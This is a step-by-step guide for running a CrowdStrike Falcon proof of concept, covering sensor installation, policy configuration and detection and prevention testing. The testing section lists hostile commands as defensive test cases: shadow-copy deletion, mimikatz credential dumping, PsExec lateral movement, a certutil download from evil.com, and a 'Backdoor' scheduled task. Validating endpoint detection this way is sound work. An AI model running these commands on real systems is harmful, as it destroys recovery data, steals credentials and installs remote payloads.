POC Guide

Complete step-by-step CrowdStrike Falcon POC delivery walkthrough

What is CrowdStrike Falcon?

CrowdStrike Falcon is a cloud-native endpoint protection platform that uses artificial intelligence and behavioral analysis to stop breaches. Unlike traditional antivirus that relies on signature databases, Falcon uses:

  • Machine Learning (ML) — Cloud and sensor-based ML models analyze files and behaviors in real-time to identify threats, including zero-day attacks never seen before.
  • Indicators of Attack (IOA) — Behavioral rules that detect WHAT an attacker is DOING rather than what tools they use. Detects the attack pattern, not just the malware.
  • EDR (Endpoint Detection & Response) — Full visibility into every process, network connection, file write, and registry change on every endpoint. Like a DVR for your endpoints.
  • Single Lightweight Agent — One ~25MB agent replaces antivirus, EDR, vulnerability scanner, firewall, USB control, and SIEM agent. ~1% CPU usage.
  • OverWatch — CrowdStrike's 24/7 elite threat hunting team proactively hunts for threats in your environment.

Why POC? A Proof of Concept lets the client see Falcon working in THEIR environment with THEIR endpoints, proving it catches real threats without disrupting their business.

1

Falcon Sensor Installation

Deploy the agent on client endpoints

▼

📋 What This Step Does

The Falcon Sensor is a lightweight agent installed on each endpoint (workstation, server). Once installed, it immediately starts monitoring all process activity, network connections, file operations, and registry changes. It sends this telemetry to the CrowdStrike cloud for analysis.

🔧 Prerequisites

  • Falcon Console access (falcon.crowdstrike.com)
  • Customer ID (CID) from Console > Host Setup > Sensor Downloads
  • Admin rights on target endpoints
  • Outbound HTTPS (443) to *.crowdstrike.com

💻 Windows Installation

PowerShell# Silent install with CID and grouping tags WindowsSensor.exe /install /quiet /norestart CID=YOUR_CID_HERE GROUPING_TAGS="poc,week1" # Verify sensor is running sc query csagent # Expected: STATE = RUNNING # Check sensor version REG QUERY "HKLM\SYSTEM\CrowdStrike" /s | findstr "CU AG" # Check cloud connectivity netstat -an | findstr ":443"

🐧 Linux Installation

Bash# Debian/Ubuntu sudo dpkg -i falcon-sensor_*.deb sudo /opt/CrowdStrike/falconctl -s --cid=YOUR_CID_HERE --tags="poc,linux" sudo systemctl start falcon-sensor sudo systemctl enable falcon-sensor # RHEL/CentOS sudo yum install falcon-sensor-*.rpm sudo /opt/CrowdStrike/falconctl -s --cid=YOUR_CID_HERE sudo systemctl start falcon-sensor # Verify sudo /opt/CrowdStrike/falconctl -g --cid sudo /opt/CrowdStrike/falconctl -g --version sudo systemctl status falcon-sensor

🍏 macOS Installation

Bash# Install PKG sudo installer -verboseR -pkg FalconSensorMacOS.pkg -target / # Set CID sudo /Applications/Falcon.app/Contents/Resources/falconctl license YOUR_CID_HERE # Verify sudo /Applications/Falcon.app/Contents/Resources/falconctl stats # IMPORTANT: Grant Full Disk Access + System Extension via MDM profile

🎯 What to Show the Client

  • Console > Hosts — show the endpoints appearing within 2-3 minutes
  • Point out: hostname, OS version, sensor version, last seen timestamp
  • Highlight: "Zero impact on user experience, users won't notice it"
  • Show sensor health: all green = fully connected and protecting
2

Policy Configuration

Set up prevention, detection, and response policies

▼

📋 What This Step Does

Policies define HOW CrowdStrike protects each endpoint. You create policies and assign them to host groups. Start with DETECT mode (alerts only) to baseline, then enable PREVENT mode (blocks threats) after confirming zero false positives.

⚙ Key Policies to Create

  • Prevention Policy — Controls ML sensitivity, behavioral protection (ransomware, credential theft, code injection), exploit mitigation, script monitoring
  • Detection Policy — Controls cloud/sensor ML analysis sensitivity and extended visibility
  • Response Policy — Controls auto-quarantine, auto-kill, network containment triggers
  • Sensor Update Policy — Controls sensor auto-update behavior (N-1 recommended for POC)

🎯 What to Show the Client

  • Console > Configuration > Prevention Policies
  • Show how easy it is to toggle protections on/off per host group
  • Emphasize: "Centrally managed from the cloud, no GPO needed"
  • Highlight MITRE ATT&CK mapping on each behavioral protection

💡 POC Strategy

Week 1: Deploy in DETECT mode — see everything, block nothing. This proves Falcon sees threats without any risk of business disruption.

Week 2: Enable PREVENT mode on test group — shows Falcon actively stopping attacks.

Week 3: Enable on all hosts — full protection, measure detection & prevention rates.

Detection Testing

Validate Falcon detects known attack techniques

▼

📋 What This Step Does

Run simulated attack techniques on POC endpoints to prove CrowdStrike detects them. Each test maps to a MITRE ATT&CK technique. The goal: 95%+ detection rate.

🧪 Test Scenarios

TEST 1: EICAR Antivirus Test Action: Save EICAR test string as eicar.com on desktop String: X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* Expected: Blocked immediately, detection in console <3 seconds TEST 2: Mimikatz Credential Dump (T1003.001) Action: Attempt to run mimikatz.exe Expected: Binary blocked by ML, process killed, Critical alert TEST 3: Encoded PowerShell (T1059.001) Action: powershell -enc [base64_encoded_command] Expected: Script monitoring detects encoded command, alert generated TEST 4: Ransomware Behavior (T1490 + T1486) Action: vssadmin delete shadows /all /quiet Expected: Shadow deletion prevented, ransomware behavior alert TEST 5: PsExec Lateral Movement (T1021.002) Action: PsExec.exe \\target -s cmd.exe Expected: Remote service execution detected TEST 6: LOLBin Abuse (T1218) Action: certutil -urlcache -split -f http://evil.com/payload.exe Expected: Certutil download detected TEST 7: Scheduled Task Persistence (T1053.005) Action: schtasks /create /tn "Backdoor" /tr "C:\bad.exe" /sc onstart Expected: Persistence creation detected TEST 8: USB Device Insert Action: Insert USB flash drive Expected: Blocked by device control policy

🎯 What to Show the Client

  • Console > Activity > Detections — show each alert appearing in real-time
  • Click into a detection: show the full process tree (parent > child > grandchild)
  • Highlight: detection time <5 seconds, MITRE mapping, severity rating
  • Compare: "Your current AV wouldn't catch test #3, #5, or #6"
4

Prevention Testing

Prove Falcon blocks attacks, not just detects them

▼

📋 What This Step Does

Switch from DETECT to PREVENT mode and re-run tests. This time, attacks are actually BLOCKED — processes killed, files quarantined, network connections terminated.

🔧 How to Enable Prevention

CONSOLE PATH: Configuration > Prevention Policies > Your Policy ENABLE THESE PROTECTIONS (set to PREVENT, not DETECT): ✓ Cloud Machine Learning → Aggressive ✓ Sensor Machine Learning → Aggressive ✓ Credential Dumping (T1003) → PREVENT ✓ Ransomware Behavior (T1486) → PREVENT ✓ Lateral Movement (T1021) → PREVENT ✓ Code Injection (T1055) → PREVENT ✓ PowerShell Monitoring → PREVENT ✓ Exploit Mitigation (all) → ENABLED ✓ Sensor Tamper Protection → ENABLED

🎯 What to Show the Client

  • Re-run the same tests from Step 3 — now they're BLOCKED, not just detected
  • Show: "Attempted to run Mimikatz > Falcon killed the process before it executed"
  • Demonstrate network containment: isolate a host with one click
  • Show RTR: connect remotely, investigate, remediate — no VPN needed
  • Key message: "Detection tells you something happened. Prevention stops it from happening."
